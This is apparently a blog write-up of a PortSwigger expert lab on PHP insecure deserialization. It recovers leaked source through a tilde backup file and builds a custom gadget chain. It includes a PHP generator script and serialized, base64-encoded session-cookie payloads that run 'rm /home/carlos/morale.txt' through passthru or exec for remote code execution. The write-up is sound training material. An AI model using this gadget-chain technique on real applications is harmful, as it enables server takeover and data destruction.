---
title: "Expert Lab: Developing a custom gadget chain for PHP deserialization"
published: true
tags: [Web Application Security, Web Security Academy, Expert Labs, Insecure Deserialization, Remote Code Execution, Gadget Chains, PHP]
image: /blog/assets/2023/supply-chain2.png
description: "Lab Description: This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution."
image_width: "256"
image_height: "256"
---

<br>
{% smart_image /blog/assets/2023/supply-chain2.png 256 256 "" eager high %}
[^1]
<br>

### Lab Link
[Lab: Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

<br>
### Lab Description
* * *
<br>
This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

<br>
### Lab Hint
* * *
<br>
You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.

<br>
### Solutions
* * *
<br>
### Solution 1: My Solution
We check the source of web pages and in all of them, there is a single line of code:

```html
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```

So we check this link in the browser, as the lab hint suggests, we can grab a copy of editor backup version of this file by adding a tilde(`~`) at the end of the file like this:

```url
https://YOUR-LAB-ID.web-security-academy.net/cgi-bin/libs/CustomTemplate.php~
```

So we get the following php code:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

So we might have a leak of some part the website code here. Also after we log in, we check the session cookie, and it turns out it is a serialized php object:

<br>
{% smart_image /blog/assets/2023/custom-gadget-chain-php1.png 1260 823 "" lazy "" avif async %}
<br>

So we can check if this website is vulnerable to insecure deserialization[^2]. 

For creating a custom gadget chain, we check the code we got above for kick-off(The first gadget in the chain that triggers the whole gadget chain) and sink gadgets(The last gadget in the chain that can execute our arbitrary code). 

In this example, it seems that `__wakeup()` magic method might be suitable as the kick-off gadget. This method is executed when the php serialized object is going to be deserialized, in our case, it might execute our payload that we're going to create. We follow the code, it finally leads to this line: `$this->desc = $desc->$default_desc_type;` in `Product` class constructor.

Also we search for a suitable sink gadget, the `DefaultMap` class has `call_user_func` which can execute arbitrary functions if we can  somehow lead our input to this function. This function gets `$this->callback` as the first parameter and `$name` as the second, in this function, the first parameter is the name of an arbitrary php function and the second is the parameter passed to that function, this function is called in `__get()` magic method, this method is called when we call an undefined property of `DefaultMap` class and the called property name is passed to the second parameter which in our case is the command we are going to execute.

Also we can assign any value to `$this->callback` in the class constructor:

```php
public function __construct($callback) {
    $this->callback = $callback;
}
```

So for example we can have a remote code execution in a code similar to this:

```php
$test = new DefaultMap('passthru');
$command = 'rm /home/carlos/morale.txt';
$test->$command;
```

We assigned our arbitrary function name (`passthru`) to `$this->callback` by passing this value to the class constructor in the first line of code above. The `passthru` php function executes any command we send to it. 

The Third line in the above code triggers the `__get()` method invocation of `DefaultMap` class which results in the following code being executed:

```php
return call_user_func($this->callback, $name);
```

`$this->callback` is `passthru` and `$name` is `rm /home/carlos/morale.txt` now which results in this file being removed from the server.

So the sink gadget and code is complete, now we need to somehow link the kick-off gadget to the sink gadget to execute these lines of codes.

If we review the leaked code, we can see that we have an object(`$this->desc`) that can have the value of our first line above:

```php
$this->desc = new DefaultMap('passthru');
```

also we have a property(`$this->default_desc_type`) that can have the value of our second line above:

```php
$this->default_desc_type = 'rm /home/carlos/morale.txt';
```

and if we follow the code, we arrive at the last part in `Product` class constructor that gets the above `$this->desc` and `$this->default_desc_type` values as parameters and assign them to `$this->desc` of its own:

```php
public function __construct($default_desc_type, $desc) {
    $this->desc = $desc->$default_desc_type;
}
```

which is exactly what we want and is the same as the third line of our code above: `$test->$command;` which results in our arbitrary code being executed.

I have prepared a php file for creating the final payload with just the parts of the leaked code that are necessary for creating the payload:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;

    public function __construct() {
        $this->desc = new DefaultMap('passthru');
        $this->default_desc_type = 'rm /home/carlos/morale.txt';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

$test = new CustomTemplate();
$ser = serialize($test);
echo($ser . "\n");
echo("===================================================\n");
echo("base64 endcoded then urlencoded: \n");
echo(urlencode(base64_encode($ser)) . "\n");

?>
```

and the output of this code is:

```
O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
===================================================
base64 endcoded then urlencoded:
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
```

Keep in mind that the php serialized object is a binary format meaning it may contain some null characters... so if we copy-paste the cleartext part from the above output:

```php
O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
```

It won't work, if we want to copy-paste the cleartext version, we need to edit it manually and the final payload will be something like this:

```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:8:"passthru";}}
```

If we don't want to edit the output and directly copy-paste the payload, as mentioned above we have to treat serialized php objects as binary format, as the `serialize` function help explains[^3]:

```
Note that this is a binary string which may include null bytes, and needs to be stored and handled as such.
For example, **serialize()** output should generally be stored in a BLOB field in a database, 
rather than a CHAR or TEXT field.
```

 That's why we base64 and url encoded the output to easily be able to copy-paste it as the session cookie. So we copy this part from the output above:

 ```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
 ```

 and paste it here in the session cookie in the Burp suite repeater:

<br>
{% smart_image /blog/assets/2023/custom-gadget-chain-php2.png 1263 818 "" lazy "" avif async %}
<br>

 and click apply and send, then boom! the carlos's morale.txt file is removed from the server and the lab is solved!


<br>
### Solution 2:  Web Security Academy's Solution

1.  Log in to your own account and notice that the session cookie contains a serialized PHP object. Notice that the website references the file `/cgi-bin/libs/CustomTemplate.php`. Obtain the source code by submitting a request using the `.php~` backup file extension.

2.  In the source code, notice that the `__wakeup()` magic method for a `CustomTemplate` will create a new `Product` by referencing the `default_desc_type` and `desc` from the `CustomTemplate`.

3.  Also notice that the `DefaultMap` class has the `__get()` magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. The function will be executed on the `$name`, which is the non-existent attribute that was requested.

4.  You can exploit this gadget chain to invoke `exec(rm /home/carlos/morale.txt)` by passing in a `CustomTemplate` object where:
    
    ```php
    CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
    CustomTemplate->desc = DefaultMap;
    DefaultMap->callback = "exec"
    ```
    
    If you follow the data flow in the source code, you will notice that this causes the `Product` constructor to try and fetch the `default_desc_type` from the `DefaultMap` object. As it doesn't have this attribute, the `__get()` method will invoke the callback `exec()` method on the `default_desc_type`, which is set to our shell command.
    
5.  To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie:
    
    ```php
    O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
    ```


<br>
### _External Links_
* * *
* #### [Lab: Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

<br>
### _References_
* * *
[^1]: Icon made by [Paul J.](https://www.flaticon.com/authors/paul-j) from [www.flaticon.com](https://www.flaticon.com/)
[^2]: [Insecure deserialization \| Web Security Academy](https://portswigger.net/web-security/deserialization)
[^3]: [PHP:serialize - Manual](https://www.php.net/manual/en/function.serialize.php)

